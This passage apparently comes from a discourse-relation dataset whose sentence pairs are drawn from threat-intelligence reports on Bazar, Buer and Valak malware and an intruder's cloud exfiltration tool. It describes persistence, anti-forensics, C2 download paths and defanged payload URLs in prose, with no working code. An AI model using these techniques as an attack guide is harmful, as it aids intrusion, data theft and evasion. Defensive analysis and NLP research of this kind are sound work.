        "S1": "They used a subdomain under a regular parent domain with a .com TLD in 2017 and 2018, but they started using sub-domains under the parent domain appspot.com and azureedge.net in 2019.",
        "S2": "The parent domain appspot.com is a domain owned by Google, and part of Google\u2019s App Engine platform as a service.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The parent domain appspot.com is a domain owned by Google, and part of Google\u2019s App Engine platform as a service.",
        "S2": "Azureedge.net is a parent domain owned by Microsoft, and part of Microsoft\u2019s Azure content delivery network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Azureedge.net is a parent domain owned by Microsoft, and part of Microsoft\u2019s Azure content delivery network.",
        "S2": "The adversary uses the command and control channel to exfiltrate small amounts of data.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary uses the command and control channel to exfiltrate small amounts of data.",
        "S2": "This is usually information containing account details.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is usually information containing account details.",
        "S2": "For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else.",
        "S2": "Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool.",
        "S2": "This tool exfiltrates specified files to cloud storage web services.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This tool exfiltrates specified files to cloud storage web services.",
        "S2": "The following cloud storage web services are supported by the malware:",
        "relation": "MISC"
    },
    {
        "S1": "The following cloud storage web services are supported by the malware:",
        "S2": "- Dropbox",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Dropbox",
        "S2": "- Google Drive",
        "relation": "LIST"
    },
    {
        "S1": "- Google Drive",
        "S2": "- OneDrive",
        "relation": "LIST"
    },
    {
        "S1": "- OneDrive",
        "S2": "The actor specifies the following arguments when running the exfiltration tool:",
        "relation": "MISC"
    },
    {
        "S1": "The actor specifies the following arguments when running the exfiltration tool:",
        "S2": "- Name of the web service to be used",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Name of the web service to be used",
        "S2": "- Parameters used for the web service, such as a client ID and/or API key",
        "relation": "LIST"
    },
    {
        "S1": "- Parameters used for the web service, such as a client ID and/or API key",
        "S2": "- Path of the file to read and exfiltrate to the web service",
        "relation": "LIST"
    },
    {
        "S1": "- Path of the file to read and exfiltrate to the web service",
        "S2": "We have observed the exfiltration tool in the following locations:",
        "relation": "MISC"
    },
    {
        "S1": "We have observed the exfiltration tool in the following locations:",
        "S2": "- C:\\Windows\\Temp\\msadcs.exe",
        "relation": "ELABORATION"
    },
    {
        "S1": "- C:\\Windows\\Temp\\msadcs.exe",
        "S2": "- C:\\Windows\\Temp\\OneDrive.exe",
        "relation": "LIST"
    },
    {
        "S1": "- C:\\Windows\\Temp\\OneDrive.exe",
        "S2": "Hashes of these files are listed at the end of this article.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Hashes of these files are listed at the end of this article.",
        "S2": "The adversary attempts to clean-up some of the traces from their intrusions.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary attempts to clean-up some of the traces from their intrusions.",
        "S2": "While we don\u2019t know what was deleted and we were unable to recover, we did see some of their anti-forensics activity:",
        "relation": "ELABORATION"
    },
    {
        "S1": "While we don\u2019t know what was deleted and we were unable to recover, we did see some of their anti-forensics activity:",
        "S2": "- Windows event logs clearing,",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Windows event logs clearing,",
        "S2": "- File deletion,",
        "relation": "LIST"
    },
    {
        "S1": "- File deletion,",
        "S2": "- Timestomping",
        "relation": "LIST"
    },
    {
        "S1": "- Timestomping",
        "S2": "An overview of the observed commands can be found in the appendix.",
        "relation": "ELABORATION"
    },
    {
        "S1": "An overview of the observed commands can be found in the appendix.",
        "S2": "For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command.",
        "relation": "MISC"
    },
    {
        "S1": "For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command.",
        "S2": "This tool is included in the UnxUtils repository.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This tool is included in the UnxUtils repository.",
        "S2": "This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.",
        "S2": "Creating a timeline is a common thing to do for forensic analysts to get a chronological view of events on a system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this email campaign, instead of relying on attachments, the attackers included links to what appeared to be a legitimate Google Docs document, which itself contained links to malicious files hosted on Google Drive or, in some cases, hosted elsewhere.",
        "S2": "In some previous phishing email campaigns, attackers leveraged SendGrid to distribute the initial emails to hide the Google Drive links in the documents behind a SendGrid URL as a way to bypass traditional defences.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In some previous phishing email campaigns, attackers leveraged SendGrid to distribute the initial emails to hide the Google Drive links in the documents behind a SendGrid URL as a way to bypass traditional defences.",
        "S2": "Samples of emails that we have seen are shown in Figure 1 and Figure 2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Samples of emails that we have seen are shown in Figure 1 and Figure 2.",
        "S2": "The link in both emails is a Google Docs link claiming to host a PDF file with a list of employees that have been terminated, as shown in Figure 3.",
        "relation": "NEXT"
    },
    {
        "S1": "The link in both emails is a Google Docs link claiming to host a PDF file with a list of employees that have been terminated, as shown in Figure 3.",
        "S2": "The link in the Google Doc redirects to the URL unitedyfl[.]com/print_preview.exe to download the malware payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The link in the Google Doc redirects to the URL unitedyfl[.]com/print_preview.exe to download the malware payload.",
        "S2": "Although, the use of target names with actuating themes is not new to this group, there has been a significant uptick in the number of emails received and this campaign has been persistently active for the past few weeks.",
        "relation": "MISC"
    },
    {
        "S1": "Although, the use of target names with actuating themes is not new to this group, there has been a significant uptick in the number of emails received and this campaign has been persistently active for the past few weeks.",
        "S2": "In most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.",
        "relation": "MISC"
    },
    {
        "S1": "In most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.",
        "S2": "The packer used in both malware payloads is identical.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The packer used in both malware payloads is identical.",
        "S2": "Most notably, the packed binaries are exe files with a randomly named export function.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Most notably, the packed binaries are exe files with a randomly named export function.",
        "S2": "The export function is responsible for payload decryption and injection.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The export function is responsible for payload decryption and injection.",
        "S2": "First, a shellcode is decrypted, which further decrypts a headerless PE loader that has the final payload in its overlay.",
        "relation": "ELABORATION"
    },
    {
        "S1": "First, a shellcode is decrypted, which further decrypts a headerless PE loader that has the final payload in its overlay.",
        "S2": "The headersless loader allocates memory, maps the payload into memory with proper permissions, and finally transfers control to it.",
        "relation": "NEXT"
    },
    {
        "S1": "The headersless loader allocates memory, maps the payload into memory with proper permissions, and finally transfers control to it.",
        "S2": "In this campaign, no process self-injection is used to load the payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this campaign, no process self-injection is used to load the payload.",
        "S2": "The Bazar backdoor is a new stealthy malware, part of the TrickBot group\u2019s toolkit arsenal and leveraged for high-value targets.",
        "relation": "MISC"
    },
    {
        "S1": "The Bazar backdoor is a new stealthy malware, part of the TrickBot group\u2019s toolkit arsenal and leveraged for high-value targets.",
        "S2": "The Bazar loader is used to download and execute the Bazar backdoor on the target system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Bazar loader is used to download and execute the Bazar backdoor on the target system.",
        "S2": "The goal of this backdoor is to execute binaries, scripts, modules, kill processes, and then remove itself from the compromised machine.",
        "relation": "NEXT"
    },
    {
        "S1": "The goal of this backdoor is to execute binaries, scripts, modules, kill processes, and then remove itself from the compromised machine.",
        "S2": "The samples used in this campaign heavily rely on control flow obfuscation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The samples used in this campaign heavily rely on control flow obfuscation.",
        "S2": "The detailed analysis report about this backdoor can be found here.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The detailed analysis report about this backdoor can be found here.",
        "S2": "The Bazar loader downloads the Bazar backdoor from the C&C using the following URI format: {C&C}/api/v\\d{3}",
        "relation": "MISC"
    },
    {
        "S1": "The Bazar loader downloads the Bazar backdoor from the C&C using the following URI format: {C&C}/api/v\\d{3}",
        "S2": "The downloaded payload is XOR-encrypted and can be decrypted using the script provided in the appendix.",
        "relation": "NEXT"
    },
    {
        "S1": "The downloaded payload is XOR-encrypted and can be decrypted using the script provided in the appendix.",
        "S2": "The downloaded malware was successfully captured by the Zscaler Cloud Sandbox: Figure 6: The Zscaler Cloud Sandbox report.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The downloaded malware was successfully captured by the Zscaler Cloud Sandbox: Figure 6: The Zscaler Cloud Sandbox report.",
        "S2": "The C&C TLS communications of the Bazar backdoor have been using certificates created in the same manner that TrickBot certificates have been created.",
        "relation": "MISC"
    },
    {
        "S1": "The C&C TLS communications of the Bazar backdoor have been using certificates created in the same manner that TrickBot certificates have been created.",
        "S2": "The C&C server TLS certificate is shown in Figure 7.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The C&C server TLS certificate is shown in Figure 7.",
        "S2": "Researchers also observed that the backdoor downloads and executes the Cobalt Strike pentesting and post-exploitation toolkit on the victim's machine within some period of time after the infection.",
        "relation": "MISC"
    },
    {
        "S1": "Researchers also observed that the backdoor downloads and executes the Cobalt Strike pentesting and post-exploitation toolkit on the victim's machine within some period of time after the infection.",
        "S2": "By deploying Cobalt Strike, it is clear that this stealthy backdoor is being used to gain a foothold in corporate networks so that ransomware can be deployed, data can be stolen, or network access could be sold to other threat actors.",
        "relation": "ELABORATION"
    },
    {
        "S1": "By deploying Cobalt Strike, it is clear that this stealthy backdoor is being used to gain a foothold in corporate networks so that ransomware can be deployed, data can be stolen, or network access could be sold to other threat actors.",
        "S2": "The Buer loader was first discovered around the end of 2019.",
        "relation": "MISC"
    },
    {
        "S1": "The Buer loader was first discovered around the end of 2019.",
        "S2": "It is a very capable malware written in C and primarily sold on Russian underground forums for around US$400.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is a very capable malware written in C and primarily sold on Russian underground forums for around US$400.",
        "S2": "Notably, this malware does not function in the CIS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Notably, this malware does not function in the CIS.",
        "S2": "It has most of the important strings encrypted and APIs are loaded by hash, just like most of the sophisticated malware these days.",
        "relation": "MISC"
    },
    {
        "S1": "It has most of the important strings encrypted and APIs are loaded by hash, just like most of the sophisticated malware these days.",
        "S2": "We are not going to go into technical details because detailed analysis of this has already published.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We are not going to go into technical details because detailed analysis of this has already published.",
        "S2": "The Buer loader was captured by the Zscaler Cloud Sandbox.",
        "relation": "MISC"
    },
    {
        "S1": "The Buer loader was captured by the Zscaler Cloud Sandbox.",
        "S2": "In addition to sandbox detections, Zscaler\u2019s multilayered cloud security platform detects indicators at various levels:",
        "relation": "ELABORATION"
    },
    {
        "S1": "In these campaigns, the most common infection vector is via Microsoft Word documents embedded with malicious macro code.",
        "S2": "The contents of the documents are in English and German depending on the target.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The contents of the documents are in English and German depending on the target.",
        "S2": "Malicious macro code is used to download a DLL file with .cab extension named \u201cU.tmp\u201d and saved into the temp folder.",
        "relation": "NEXT"
    },
    {
        "S1": "Malicious macro code is used to download a DLL file with .cab extension named \u201cU.tmp\u201d and saved into the temp folder.",
        "S2": "DLL file download address: \u201chxxp://v0rzpbu[.]com/we201o85/aio0i32p.php?l=hopo4.cab\u201d",
        "relation": "ELABORATION"
    },
    {
        "S1": "DLL file download address: \u201chxxp://v0rzpbu[.]com/we201o85/aio0i32p.php?l=hopo4.cab\u201d",
        "S2": "After downloading the DLL, the code launches the malicious DLL using \u201cregsvr32.exe\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "After downloading the DLL, the code launches the malicious DLL using \u201cregsvr32.exe\u201d.",
        "S2": "When executed, the DLL drops and launches using a WinExec API call.",
        "relation": "NEXT"
    },
    {
        "S1": "When executed, the DLL drops and launches using a WinExec API call.",
        "S2": "This stage of the Valak malware uses a malicious JavaScript file with a random name that changes per execution.",
        "relation": "NEXT"
    },
    {
        "S1": "This stage of the Valak malware uses a malicious JavaScript file with a random name that changes per execution.",
        "S2": "In the example below the name of the JavaScript file is \u201csly4.0\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the example below the name of the JavaScript file is \u201csly4.0\u201d.",
        "S2": "The downloaded JavaScript code, \u201csly4.0\u201d, contains a variable called \u201cPRIMARY_C2\u201d that holds multiple fake and legitimate domains, including Google, Gmail, Avast, and Microsoft.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The downloaded JavaScript code, \u201csly4.0\u201d, contains a variable called \u201cPRIMARY_C2\u201d that holds multiple fake and legitimate domains, including Google, Gmail, Avast, and Microsoft.",
        "S2": "The domain list varies between samples.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The domain list varies between samples.",
        "S2": "Valak creates connections to the different C2 servers in the list with two predefined URIs:",
        "relation": "MISC"
    },
    {
        "S1": "Valak creates connections to the different C2 servers in the list with two predefined URIs:",
        "S2": "One URI is used to download an encoded file named \u201cproject.aspx\u201d",
        "relation": "NEXT"
    },
    {
        "S1": "One URI is used to download an encoded file named \u201cproject.aspx\u201d",
        "S2": "[saved as project[1].htm].",
        "relation": "ELABORATION"
    },
    {
        "S1": "[saved as project[1].htm].",
        "S2": "*in version 30, the file was renamed to \u201crpx.aspx\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "*in version 30, the file was renamed to \u201crpx.aspx\u201d.",
        "S2": "One URI is used to download an encoded file named \u201ca.aspx\u201d [saved as a[1].htm].",
        "relation": "MISC"
    },
    {
        "S1": "One URI is used to download an encoded file named \u201ca.aspx\u201d [saved as a[1].htm].",
        "S2": "*in version 30, the file was renamed to \u201cgo.aspx\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "*in version 30, the file was renamed to \u201cgo.aspx\u201d.",
        "S2": "Both files are decoded by the malware using Base64 and an XOR cipher.",
        "relation": "MISC"
    },
    {
        "S1": "Both files are decoded by the malware using Base64 and an XOR cipher.",
        "S2": "The key is a combination of a predefined string and information collected from memory during runtime.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The key is a combination of a predefined string and information collected from memory during runtime.",
        "S2": "The malware sets information like the C2 server, ID, the downloaded payload, and the decoded project.aspx in a registry key under \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware sets information like the C2 server, ID, the downloaded payload, and the decoded project.aspx in a registry key under \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\u201d.",
        "S2": "These keys will be used in the second stage.",
        "relation": "NEXT"
    },
    {
        "S1": "These keys will be used in the second stage.",
        "S2": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.",
        "relation": "MISC"
    },
    {
        "S1": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.",
        "S2": "The scheduled task is set to launch wscript that executes JavaScript stored as an Alternative Data Stream named \u201cDefault2.ini\u201d in the file \u201cClassic2Application.bz\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "The scheduled task is set to launch wscript that executes JavaScript stored as an Alternative Data Stream named \u201cDefault2.ini\u201d in the file \u201cClassic2Application.bz\u201d.",
        "S2": "The script in the ADS (\u201cDefault2.ini\u201d) executes the content of the registry key, \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\\ServerUrl\u201d, which holds the contents of \u201cproject.aspx\u201d, the second stage JavaScript file.",
        "relation": "NEXT"
    },
    {
        "S1": "The script in the ADS (\u201cDefault2.ini\u201d) executes the content of the registry key, \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\\ServerUrl\u201d, which holds the contents of \u201cproject.aspx\u201d, the second stage JavaScript file.",
        "S2": "In the first stage, Valak laid the foundation for the attack.",
        "relation": "MISC"
    },
    {
        "S1": "In the first stage, Valak laid the foundation for the attack.",
        "S2": "In the second stage, it downloads additional modules for reconnaissance activity and to steal sensitive information.",
        "relation": "NEXT"
    },
    {
        "S1": "In the second stage, it downloads additional modules for reconnaissance activity and to steal sensitive information.",
        "S2": "The two payloads (\u201cproject.aspx\u201d and \u201ca.aspx\u201d) and the configuration in the registry keys are used in the second stage to perform malicious activities.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The two payloads (\u201cproject.aspx\u201d and \u201ca.aspx\u201d) and the configuration in the registry keys are used in the second stage to perform malicious activities.",
        "S2": "The \u201cproject.aspx\u201d, or as we refer to it, the second stage JS, is a JavaScript file that looks very similar to the first stage JavaScript (\u201csly4.0\u201d).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The \u201cproject.aspx\u201d, or as we refer to it, the second stage JS, is a JavaScript file that looks very similar to the first stage JavaScript (\u201csly4.0\u201d).",
        "S2": "However, on closer inspection it contains additional functions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, on closer inspection it contains additional functions.",
        "S2": "The script is executed by the scheduled task used to maintain persistence, with its main goal being:",
        "relation": "MISC"
    },
    {
        "S1": "The script is executed by the scheduled task used to maintain persistence, with its main goal being:",
        "S2": "Execute Pluginhost.exe, the plugin management component.",
        "relation": "MISC"
    },
    {
        "S1": "Execute Pluginhost.exe, the plugin management component.",
        "S2": "Download and parse additional payloads from the C2.",
        "relation": "NEXT"
    },
    {
        "S1": "Download and parse additional payloads from the C2.",
        "S2": "Save the payloads as Alternate Data Streams and set scheduled tasks to run them.",
        "relation": "NEXT"
    },
    {
        "S1": "Save the payloads as Alternate Data Streams and set scheduled tasks to run them.",
        "S2": "In the second stage, the configuration file has been altered to contain a unique \u201cClient_ID\u201d and a different file that it will try to download called \u201cbounce.aspx\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "In the second stage, the configuration file has been altered to contain a unique \u201cClient_ID\u201d and a different file that it will try to download called \u201cbounce.aspx\u201d.",
        "S2": "Stage 2 also contains three unique functions, \u201cCreateExecJob\u201d, \u201cCreateOleExecJob\u201d and \u201cLaunchPlugin\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Stage 2 also contains three unique functions, \u201cCreateExecJob\u201d, \u201cCreateOleExecJob\u201d and \u201cLaunchPlugin\u201d.",
        "S2": "These functions are called from the \u201cParseTask\u201d function, and receive the parsed tasks from the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These functions are called from the \u201cParseTask\u201d function, and receive the parsed tasks from the C2.",
        "S2": "If the malware downloads a payload that starts with the word \u201cODTASK\u201d, it calls \u201cCreateOleExecJob\u201d, which writes the payload as an ADS of the file \u201cC:\\\\Users\\\\Public\\\\PowerManagerSpm.jar\u201d and creates a scheduled task \u201cPerfWatson_%taskname%\u201d to run it.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the malware downloads a payload that starts with the word \u201cODTASK\u201d, it calls \u201cCreateOleExecJob\u201d, which writes the payload as an ADS of the file \u201cC:\\\\Users\\\\Public\\\\PowerManagerSpm.jar\u201d and creates a scheduled task \u201cPerfWatson_%taskname%\u201d to run it.",
        "S2": "If the malware receives a content start with the word \u201cPLUGIN\u201d, it calls \u201cLaunchPlugin\u201d, which executes the PluginHost.exe file using WMI with the content as an argument.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the malware receives a content start with the word \u201cPLUGIN\u201d, it calls \u201cLaunchPlugin\u201d, which executes the PluginHost.exe file using WMI with the content as an argument.",
        "S2": "If the malware receives a content starting with the word \u201cTASK\u201d, it calls \u201cCreateExecJob\u201d, which writes the content as an ADS of the file \u201cC:\\\\Users\\\\Public\\\\PowerManagerSpm.jar\u201d and creates a scheduled task \u201cPowerUtility_%taskname%W\u201d to run it.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the malware receives a content starting with the word \u201cTASK\u201d, it calls \u201cCreateExecJob\u201d, which writes the content as an ADS of the file \u201cC:\\\\Users\\\\Public\\\\PowerManagerSpm.jar\u201d and creates a scheduled task \u201cPowerUtility_%taskname%W\u201d to run it.",
        "S2": "Our analysis reveals that this time, the payload downloaded by Valak was IcedID.",
        "relation": "MISC"
    },
    {
        "S1": "Our analysis reveals that this time, the payload downloaded by Valak was IcedID.",
        "S2": "However, the payload can vary, as the attackers can download other payloads to the infected system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, the payload can vary, as the attackers can download other payloads to the infected system.",
        "S2": "In previous infections, Valak downloaded different remote administration tools like putty.exe and NetSupport Manager.",
        "relation": "MISC"
    },
    {
        "S1": "In previous infections, Valak downloaded different remote administration tools like putty.exe and NetSupport Manager.",
        "S2": "The decoded \u201ca.aspx\u201d is saved in the temporary folder as %TEMP%\\<ID>.bin.",
        "relation": "MISC"
    },
    {
        "S1": "The decoded \u201ca.aspx\u201d is saved in the temporary folder as %TEMP%\\<ID>.bin.",
        "S2": "This file, internally named \u201cPluginHost.exe\u201d, is an executable file, and will be used to manage additional components.",
        "relation": "NEXT"
    },
    {
        "S1": "This file, internally named \u201cPluginHost.exe\u201d, is an executable file, and will be used to manage additional components.",
        "S2": "Valak\u2019s Modular Plugin Architecture",
        "relation": "MISC"
    },
    {
        "S1": "Valak\u2019s Modular Plugin Architecture",
        "S2": "The functionality of the executable \u201cPluginHost.exe\u201d is divided into four classes: Bot, HTTPClient, Program and Utils, which will allow it to perform its main goal of downloading and loading additional components of the malware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The functionality of the executable \u201cPluginHost.exe\u201d is divided into four classes: Bot, HTTPClient, Program and Utils, which will allow it to perform its main goal of downloading and loading additional components of the malware.",
        "S2": "The bot class is responsible for reading from several registry entries set by the first stage.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The bot class is responsible for reading from several registry entries set by the first stage.",
        "S2": "GetID() reads from the registry entry \u201c SetupServiceKey \u201d, which holds the ID.",
        "relation": "ELABORATION"
    },
    {
        "S1": "GetID() reads from the registry entry \u201c SetupServiceKey \u201d, which holds the ID.",
        "S2": "\u201d, which holds the ID",
        "relation": "ELABORATION"
    },
    {
        "S1": "\u201d, which holds the ID",
        "S2": ".",
        "relation": "MISC"
    },
    {
        "S1": ".",
        "S2": "GetC2() reads from the registry entry \u201cShimV4\u201d, which holds the C2 domain.",
        "relation": "MISC"
    },
    {
        "S1": "GetC2() reads from the registry entry \u201cShimV4\u201d, which holds the C2 domain.",
        "S2": "Both functions use the Utils class to read registry entries.",
        "relation": "MISC"
    },
    {
        "S1": "Both functions use the Utils class to read registry entries.",
        "S2": "The HTTPClient class contains two functions, post and GetPluginBytes.",
        "relation": "MISC"
    },
    {
        "S1": "The HTTPClient class contains two functions, post and GetPluginBytes.",
        "S2": "The GetPluginBytes() function gets the C2 domain using GetC2() and adds an embedded URI.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The GetPluginBytes() function gets the C2 domain using GetC2() and adds an embedded URI.",
        "S2": "The URL is used to download an additional module for the plugin.",
        "relation": "NEXT"
    },
    {
        "S1": "The URL is used to download an additional module for the plugin.",
        "S2": "The Program class contains the main function of the file main().",
        "relation": "MISC"
    },
    {
        "S1": "The Program class contains the main function of the file main().",
        "S2": "This function executes the function GetPluginBytes() to download the module components with type \u201cManagedPlugin\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This function executes the function GetPluginBytes() to download the module components with type \u201cManagedPlugin\u201d.",
        "S2": "These components will be loaded reflectively to the executable\u2019s memory and expand the plugin capabilities.",
        "relation": "NEXT"
    },
    {
        "S1": "These components will be loaded reflectively to the executable\u2019s memory and expand the plugin capabilities.",
        "S2": "The Utils class contains several maintenance functions used by the other classes.",
        "relation": "MISC"
    },
    {
        "S1": "The Utils class contains several maintenance functions used by the other classes.",
        "S2": "When referring to additional plugins, it is worth noting that in early versions of Valak the plugins were downloaded by the second stage JS via PowerShell.",
        "relation": "MISC"
    },
    {
        "S1": "When referring to additional plugins, it is worth noting that in early versions of Valak the plugins were downloaded by the second stage JS via PowerShell.",
        "S2": "More recent versions of Valak abandoned the popular yet easily detectable PowerShell downloader approach and transitioned to PluginHost as a means of managing and downloading additional payloads.",
        "relation": "ELABORATION"
    },
    {
        "S1": "More recent versions of Valak abandoned the popular yet easily detectable PowerShell downloader approach and transitioned to PluginHost as a means of managing and downloading additional payloads.",
        "S2": "This transition indicates that the Valak authors are looking for stealthier approaches and ways to improve their evasion techniques.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This transition indicates that the Valak authors are looking for stealthier approaches and ways to improve their evasion techniques.",
        "S2": "During this analysis, we discovered several different modules with the same internal name, \u201cManagedPlugin.dll\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "During this analysis, we discovered several different modules with the same internal name, \u201cManagedPlugin.dll\u201d.",
        "S2": "These modules are downloaded and loaded by \u201cPluginHost.exe\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These modules are downloaded and loaded by \u201cPluginHost.exe\u201d.",
        "S2": "- Systeminfo : responsible for extensive reconnaissance; targets local and domain admins",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Systeminfo : responsible for extensive reconnaissance; targets local and domain admins",
        "S2": "- Exchgrabber: aims to steal Microsoft Exchange data and infiltrates the enterprises mail system",
        "relation": "LIST"
    },
    {
        "S1": "- Exchgrabber: aims to steal Microsoft Exchange data and infiltrates the enterprises mail system",
        "S2": "- IPGeo: verifies the geolocation of the target",
        "relation": "LIST"
    },
    {
        "S1": "- IPGeo: verifies the geolocation of the target",
        "S2": "- Procinfo: collects information about the infected machine\u2019s running processes",
        "relation": "LIST"
    },
    {
        "S1": "- Procinfo: collects information about the infected machine\u2019s running processes",
        "S2": "- Netrecon: performs network reconnaissance",
        "relation": "LIST"
    },
    {
        "S1": "- Netrecon: performs network reconnaissance",
        "S2": "- Screencap: captures screenshots from the infected machine",
        "relation": "LIST"
    },
    {
        "S1": "- Screencap: captures screenshots from the infected machine",
        "S2": "Among these components, some focus on one single, specific activity to achieve their goal and are relatively less robust than others when it comes to capability and potential impact.",
        "relation": "MISC"
    },
    {
        "S1": "Among these components, some focus on one single, specific activity to achieve their goal and are relatively less robust than others when it comes to capability and potential impact.",
        "S2": "This includes ipgeo, procinfo, netrecon and screencap.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This includes ipgeo, procinfo, netrecon and screencap.",
        "S2": "Below is a deep dive of \u201csysteminfo\u201d and \u201cexchgrabber\u201d, which are more advanced and complex than the aforementioned plugin components.",
        "relation": "MISC"
    },
    {
        "S1": "Below is a deep dive of \u201csysteminfo\u201d and \u201cexchgrabber\u201d, which are more advanced and complex than the aforementioned plugin components.",
        "S2": "\u201cSysteminfo\u201d shares many similarities to \u201cPluginHost.exe\u201d when it comes to class names.",
        "relation": "ELABORATION"
    },
    {
        "S1": "\u201cSysteminfo\u201d shares many similarities to \u201cPluginHost.exe\u201d when it comes to class names.",
        "S2": "However, unlike \u201cPluginHost\u201d, it contains several reconnaissance functions that focus on gathering information about the user, the machine, and existing AV products.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, unlike \u201cPluginHost\u201d, it contains several reconnaissance functions that focus on gathering information about the user, the machine, and existing AV products.",
        "S2": "The module gathers information about the user and attempts to verify whether this is a local admin or a domain admin.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The module gathers information about the user and attempts to verify whether this is a local admin or a domain admin.",
        "S2": "This shows that after infecting the machine, Valak chooses to target mainly administrators and domain admins.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This shows that after infecting the machine, Valak chooses to target mainly administrators and domain admins.",
        "S2": "This indicates a propensity to target higher profile accounts such as enterprise admins.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This indicates a propensity to target higher profile accounts such as enterprise admins.",
        "S2": "The module attempts to find whether the infected machine has any security products installed using the AntivirusSoftware() function.",
        "relation": "NEXT"
    },
    {
        "S1": "The module attempts to find whether the infected machine has any security products installed using the AntivirusSoftware() function.",
        "S2": "The information collected about installed AV programs is gathered using the WMI query \u201cSELECT * FROM AntiVirusProduct\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "The information collected about installed AV programs is gathered using the WMI query \u201cSELECT * FROM AntiVirusProduct\u201d.",
        "S2": "The module also collects the physical address (MAC) and the IP address of the infected machine.",
        "relation": "NEXT"
    },
    {
        "S1": "The module also collects the physical address (MAC) and the IP address of the infected machine.",
        "S2": "Additional reconnaissance activity occurs with several other functions, including:",
        "relation": "NEXT"
    },
    {
        "S1": "Additional reconnaissance activity occurs with several other functions, including:",
        "S2": "- NetUser - provides more information about the user",
        "relation": "ELABORATION"
    },
    {
        "S1": "- NetUser - provides more information about the user",
        "S2": "- provides more information about the user SystemUpTime - records the amount of time the machine is running",
        "relation": "LIST"
    },
    {
        "S1": "- provides more information about the user SystemUpTime - records the amount of time the machine is running",
        "S2": "- records the amount of time the machine is running WindowsVersion - determines the Windows version",
        "relation": "LIST"
    },
    {
        "S1": "- records the amount of time the machine is running WindowsVersion - determines the Windows version",
        "S2": "In order to exfiltrate data, the plugin uses the function \u201cpost\u201d in the HTTPClient class.",
        "relation": "NEXT"
    },
    {
        "S1": "In order to exfiltrate data, the plugin uses the function \u201cpost\u201d in the HTTPClient class.",
        "S2": "\u201cPost\u201d gives the plugin the ability to upload content and exfiltrate data to the remote C2 whose domain is stored in the registry.",
        "relation": "ELABORATION"
    },
    {
        "S1": "\u201cPost\u201d gives the plugin the ability to upload content and exfiltrate data to the remote C2 whose domain is stored in the registry.",
